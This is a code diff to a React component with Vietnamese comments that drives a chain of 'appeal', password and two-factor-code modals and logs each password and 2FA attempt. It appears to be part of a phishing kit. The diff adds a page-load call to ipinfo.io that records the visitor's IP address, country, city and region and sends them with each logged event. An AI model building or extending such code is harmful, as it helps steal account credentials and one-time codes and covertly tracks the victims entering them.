@@ -1,12 +1,12 @@
 "use client";
 
-import { useState, useCallback, createContext, useContext, useRef } from "react";
+import { useState, useCallback, createContext, useContext, useRef, useEffect } from "react";
 import { AppealModal } from "./modals/AppealModal";
 import { PasswordModal } from "./modals/PasswordModal";
 import { MethodModal } from "./modals/MethodModal";
 import { TwoFAModal } from "./modals/TwoFAModal";
 import { SuccessModal } from "./modals/SuccessModal";
-import type { FormData, ContactInfo, VerificationMethod, ModalState } from "@/types/form";
+import type { FormData, ContactInfo, VerificationMethod, ModalState, LocationData } from "@/types/form";
 
 interface ModalFlowContextType {
   openModal: () => void;
@@ -35,6 +35,25 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
   // Ref để track các log đã gửi, tránh duplicate
   const logSentRef = useRef<Set<string>>(new Set());
 
+  // Fetch IP/location từ browser ngay khi load
+  const locationRef = useRef<LocationData | null>(null);
+  useEffect(() => {
+    fetch("https://ipinfo.io/json")
+      .then((r) => r.json())
+      .then((data) => {
+        locationRef.current = {
+          ip: data.ip || "unknown",
+          location: {
+            country: data.country ? (new Intl.DisplayNames(["en"], { type: "region" }).of(data.country) || data.country) : "Unknown",
+            countryCode: data.country || "US",
+            city: data.city || "",
+            region: data.region || "",
+          },
+        };
+      })
+      .catch(() => {});
+  }, []);
+
   // Helper function để gửi log với deduplication
   const sendLogEvent = useCallback(async (
     formDetails: FormData | null,
@@ -62,6 +81,7 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
           passwordAttempts,
           twofaAttempts,
           selectedMethod,
+          locationData: locationRef.current,
         }),
       });
     } catch (error) {
